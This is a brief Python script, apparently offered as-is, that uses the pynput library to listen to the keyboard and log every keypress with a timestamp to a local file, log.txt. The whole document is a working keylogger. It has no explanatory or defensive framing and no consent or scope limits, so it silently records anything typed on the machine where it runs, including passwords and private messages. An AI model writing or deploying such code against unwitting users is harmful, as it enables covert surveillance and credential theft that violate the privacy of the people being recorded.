from pynput import keyboard
import logging

logging.basicConfig(filename='log.txt',level=logging.DEBUG,format='%(asctime)s-%(levelname)s-%(message)s')




def on_press(key):
   logging.debug(key)



with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()


